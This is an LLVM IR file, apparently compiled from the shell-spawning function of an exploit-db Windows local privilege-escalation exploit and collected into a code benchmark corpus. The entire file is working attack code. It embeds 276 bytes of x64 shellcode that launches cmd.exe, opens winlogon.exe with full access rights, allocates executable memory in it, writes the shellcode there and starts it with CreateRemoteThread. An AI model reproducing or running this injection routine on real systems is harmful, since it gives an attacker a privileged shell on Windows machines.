; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/local/extr_43109.c_spawnShell.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/local/extr_43109.c_spawnShell.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@__const.spawnShell.shellcode = private unnamed_addr constant [276 x i8] c"\FCH\83\E4\F0\E8\C0\00\00\00AQAPRQVH1\D2eH\8BR`H\8BR\18H\8BR H\8BrPH\0F\B7JJM1\C9H1\C0\AC<a|\02, A\C1\C9\0DA\01\C1\E2\EDRAQH\8BR \8BB<H\01\D0\8B\80\88\00\00\00H\85\C0tgH\01\D0P\8BH\18D\8B@ I\01\D0\E3VH\FF\C9A\8B4\88H\01\D6M1\C9H1\C0\ACA\C1\C9\0DA\01\C18\E0u\F1L\03L$\08E9\D1u\D8XD\8B@$I\01\D0fA\8B\0CHD\8B@\1CI\01\D0A\8B\04\88H\01\D0AXAX^YZAXAYAZH\83\EC AR\FF\E0XAYZH\8B\12\E9W\FF\FF\FF]H\BA\01\00\00\00\00\00\00\00H\8D\8D\01\01\00\00A\BA1\8Bo\87\FF\D5\BB\E0\1D*\0AA\BA\A6\95\BD\9D\FF\D5H\83\C4(<\06|\0A\80\FB\E0u\05\BBG\13roj\00YA\89\DA\FF\D5cmd.exe\00\00", align 16
@.str = private unnamed_addr constant [13 x i8] c"winlogon.exe\00", align 1
@PROCESS_ALL_ACCESS = common dso_local global i32 0, align 4
@FALSE = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [33 x i8] c"\0A[-] Unable to open %s process\0A\0A\00", align 1
@.str.2 = private unnamed_addr constant [61 x i8] c"\0A[+] Opened %s process pid=%d with PROCESS_ALL_ACCESS rights\00", align 1
@MEM_RESERVE = common dso_local global i32 0, align 4
@MEM_COMMIT = common dso_local global i32 0, align 4
@PAGE_EXECUTE_READWRITE = common dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [51 x i8] c"\0A[-] Unable to allocate memory in target process\0A\0A\00", align 1
@.str.4 = private unnamed_addr constant [38 x i8] c"\0A[+] Memory allocated at address 0x%p\00", align 1
@.str.5 = private unnamed_addr constant [41 x i8] c"\0A[-] Unable to write to process memory\0A\0A\00", align 1
@.str.6 = private unnamed_addr constant [41 x i8] c"\0A[+] Written to allocated process memory\00", align 1
@.str.7 = private unnamed_addr constant [38 x i8] c"\0A[-] Unable to create remote thread\0A\0A\00", align 1
@.str.8 = private unnamed_addr constant [42 x i8] c"\0A[+] Created remote thread and executed\0A\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @spawnShell() #0 {
  %1 = alloca i32, align 4
  %2 = alloca [276 x i8], align 16
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32*, align 8
  %6 = alloca i32*, align 8
  %7 = alloca i32*, align 8
  %8 = bitcast [276 x i8]* %2 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 16 %8, i8* align 16 getelementptr inbounds ([276 x i8], [276 x i8]* @__const.spawnShell.shellcode, i32 0, i32 0), i64 276, i1 false)
  store i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str, i64 0, i64 0), i8** %3, align 8
  %9 = load i8*, i8** %3, align 8
  %10 = call i32 @getProcessId(i8* %9)
  store i32 %10, i32* %4, align 4
  %11 = load i32, i32* @PROCESS_ALL_ACCESS, align 4
  %12 = load i32, i32* @FALSE, align 4
  %13 = load i32, i32* %4, align 4
  %14 = call i32* @OpenProcess(i32 %11, i32 %12, i32 %13)
  store i32* %14, i32** %5, align 8
  %15 = icmp eq i32* %14, null
  br i1 %15, label %16, label %19

16:                                               ; preds = %0
  %17 = load i8*, i8** %3, align 8
  %18 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.1, i64 0, i64 0), i8* %17)
  store i32 -1, i32* %1, align 4
  br label %55

19:                                               ; preds = %0
  %20 = load i8*, i8** %3, align 8
  %21 = load i32, i32* %4, align 4
  %22 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([61 x i8], [61 x i8]* @.str.2, i64 0, i64 0), i8* %20, i32 %21)
  %23 = load i32*, i32** %5, align 8
  %24 = load i32, i32* @MEM_RESERVE, align 4
  %25 = load i32, i32* @MEM_COMMIT, align 4
  %26 = or i32 %24, %25
  %27 = load i32, i32* @PAGE_EXECUTE_READWRITE, align 4
  %28 = call i32* @VirtualAllocEx(i32* %23, i32* null, i32 4096, i32 %26, i32 %27)
  store i32* %28, i32** %7, align 8
  %29 = icmp eq i32* %28, null
  br i1 %29, label %30, label %32

30:                                               ; preds = %19
  %31 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([51 x i8], [51 x i8]* @.str.3, i64 0, i64 0))
  store i32 -1, i32* %1, align 4
  br label %55

32:                                               ; preds = %19
  %33 = load i32*, i32** %7, align 8
  %34 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([38 x i8], [38 x i8]* @.str.4, i64 0, i64 0), i32* %33)
  %35 = load i32*, i32** %5, align 8
  %36 = load i32*, i32** %7, align 8
  %37 = getelementptr inbounds [276 x i8], [276 x i8]* %2, i64 0, i64 0
  %38 = call i32 @WriteProcessMemory(i32* %35, i32* %36, i8* %37, i32 276, i32* null)
  %39 = icmp ne i32 %38, 0
  br i1 %39, label %42, label %40

40:                                               ; preds = %32
  %41 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([41 x i8], [41 x i8]* @.str.5, i64 0, i64 0))
  store i32 -1, i32* %1, align 4
  br label %55

42:                                               ; preds = %32
  %43 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([41 x i8], [41 x i8]* @.str.6, i64 0, i64 0))
  %44 = load i32*, i32** %5, align 8
  %45 = load i32*, i32** %7, align 8
  %46 = ptrtoint i32* %45 to i32
  %47 = call i32* @CreateRemoteThread(i32* %44, i32* null, i32 0, i32 %46, i32* null, i32 0, i32* null)
  store i32* %47, i32** %6, align 8
  %48 = icmp eq i32* %47, null
  br i1 %48, label %49, label %53

49:                                               ; preds = %42
  %50 = load i32*, i32** %6, align 8
  %51 = call i32 @CloseHandle(i32* %50)
  %52 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([38 x i8], [38 x i8]* @.str.7, i64 0, i64 0))
  store i32 -1, i32* %1, align 4
  br label %55

53:                                               ; preds = %42
  %54 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([42 x i8], [42 x i8]* @.str.8, i64 0, i64 0))
  store i32 0, i32* %1, align 4
  br label %55

55:                                               ; preds = %53, %49, %40, %30, %16
  %56 = load i32, i32* %1, align 4
  ret i32 %56
}

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #1

declare dso_local i32 @getProcessId(i8*) #2

declare dso_local i32* @OpenProcess(i32, i32, i32) #2

declare dso_local i32 @printf(i8*, ...) #2

declare dso_local i32* @VirtualAllocEx(i32*, i32*, i32, i32, i32) #2

declare dso_local i32 @WriteProcessMemory(i32*, i32*, i8*, i32, i32*) #2

declare dso_local i32* @CreateRemoteThread(i32*, i32*, i32, i32, i32*, i32, i32*) #2

declare dso_local i32 @CloseHandle(i32*) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { argmemonly nounwind willreturn }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
